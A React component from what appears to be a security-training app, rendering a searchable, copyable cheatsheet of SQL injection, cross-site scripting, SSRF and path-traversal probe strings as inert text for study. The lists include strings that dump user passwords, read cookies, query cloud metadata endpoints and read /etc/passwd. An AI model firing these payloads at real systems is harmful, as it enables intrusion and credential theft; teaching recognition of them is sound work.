"use client";

import { useMemo, useState } from "react";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Field, Input } from "@/components/ui/input";

/*
 * NOTE: every payload below is an inert display string rendered as plain
 * text inside <code> elements. Nothing here is ever executed, fetched, or
 * injected into the DOM — there is no dangerouslySetInnerHTML, no eval(),
 * and no network call anywhere in this component.
 */

export interface PayloadCategory {
  id: string;
  title: string;
  description: string;
  payloads: string[];
}

export const PAYLOAD_CATEGORIES: PayloadCategory[] = [
  {
    id: "sqli",
    title: "SQL injection",
    description: "Classic authentication-bypass and probing strings.",
    payloads: [
      "' OR '1'='1",
      "' OR '1'='1' -- ",
      '" OR "1"="1',
      "admin' -- ",
      "' UNION SELECT NULL, username, password FROM users -- ",
      "1' ORDER BY 3 -- ",
      "' AND SLEEP(5) -- ",
      "1; SELECT pg_sleep(5) -- ",
    ],
  },
  {
    id: "xss",
    title: "Cross-site scripting",
    description: "Reflected-XSS probes for spotting unsanitised output.",
    payloads: [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      '"><svg onload=alert(1)>',
      "javascript:alert(1)",
      '<iframe src="javascript:alert(1)">',
      "'\"><img src=x onerror=alert(document.domain)>",
      "<details open ontoggle=alert(1)>",
      '"><script>alert(document.cookie)</script>',
    ],
  },
  {
    id: "ssrf",
    title: "SSRF",
    description: "Server-side request forgery probes for URL fetchers.",
    payloads: [
      "http://127.0.0.1/",
      "http://localhost:8080/admin",
      "http://169.254.169.254/latest/meta-data/",
      "http://0.0.0.0/",
      "http://[::1]/",
      "http://example.com@127.0.0.1/",
      "file:///etc/passwd",
    ],
  },
  {
    id: "traversal",
    title: "Path traversal",
    description: "Directory-escape probes for file-serving endpoints.",
    payloads: [
      "../etc/passwd",
      "../../etc/passwd",
      "....//....//etc/passwd",
      "%2e%2e%2fetc%2fpasswd",
      "..%5c..%5cwindows%5cwin.ini",
      "/etc/passwd%00",
      "....\\\\....\\\\windows\\\\win.ini",
    ],
  },
];

export function PayloadCheatsheet() {
  const [query, setQuery] = useState("");
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const visible = useMemo(() => {
    const needle = query.trim().toLowerCase();
    if (!needle) return PAYLOAD_CATEGORIES;
    return PAYLOAD_CATEGORIES.map((category) => ({
      ...category,
      payloads: category.payloads.filter((payload) => payload.toLowerCase().includes(needle)),
    })).filter((category) => category.payloads.length > 0);
  }, [query]);

  async function copyPayload(key: string, payload: string) {
    try {
      await navigator.clipboard.writeText(payload);
      setCopiedKey(key);
      window.setTimeout(() => setCopiedKey((current) => (current === key ? null : current)), 1600);
    } catch {
      setCopiedKey(null);
    }
  }

  return (
    <Card data-testid="payload-cheatsheet">
      <div className="mb-3 flex flex-wrap items-center justify-between gap-2">
        <h2 className="text-sm font-semibold text-foreground">Payload cheatsheet</h2>
        <Badge tone="neutral">study reference · inert text</Badge>
      </div>
      <p className="text-sm text-muted">
        Recognise these patterns in lessons and challenges. Copy one to your notes — nothing here runs or
        leaves the browser.
      </p>

      <div className="mt-4">
        <Field label="Filter payloads" htmlFor="cheatsheet-filter" hint="Searches across all categories.">
          <Input
            id="cheatsheet-filter"
            data-testid="cheatsheet-filter"
            type="search"
            value={query}
            onChange={(event) => setQuery(event.target.value)}
            placeholder="e.g. script, union, 127.0.0.1, ../"
            autoComplete="off"
          />
        </Field>
      </div>

      <div className="mt-4 space-y-6" aria-live="polite">
        {visible.length === 0 ? (
          <p role="status" data-testid="cheatsheet-empty" className="text-sm text-muted">
            No payloads match “{query}”.
          </p>
        ) : null}
        {visible.map((category) => (
          <section key={category.id} aria-labelledby={`cheatsheet-${category.id}`} data-testid={`cheatsheet-category-${category.id}`}>
            <h3 id={`cheatsheet-${category.id}`} className="text-sm font-semibold text-foreground">
              {category.title}{" "}
              <span className="font-mono text-[11px] font-normal text-faint">
                ({category.payloads.length})
              </span>
            </h3>
            <p className="mt-0.5 text-xs text-muted">{category.description}</p>
            <ul className="mt-2 space-y-1.5">
              {category.payloads.map((payload) => {
                const key = `${category.id}:${payload}`;
                const copied = copiedKey === key;
                return (
                  <li
                    key={key}
                    className="flex items-center gap-2 rounded-md border border-border bg-background px-2.5 py-1.5"
                  >
                    <code className="min-w-0 flex-1 break-all font-mono text-xs text-foreground">
                      {payload}
                    </code>
                    <Button
                      type="button"
                      variant="ghost"
                      size="sm"
                      data-testid={`cheatsheet-copy-${category.id}`}
                      onClick={() => copyPayload(key, payload)}
                      aria-label={copied ? `Copied ${payload}` : `Copy ${payload}`}
                    >
                      {copied ? "Copied" : "Copy"}
                    </Button>
                  </li>
                );
              })}
            </ul>
          </section>
        ))}
      </div>
    </Card>
  );
}
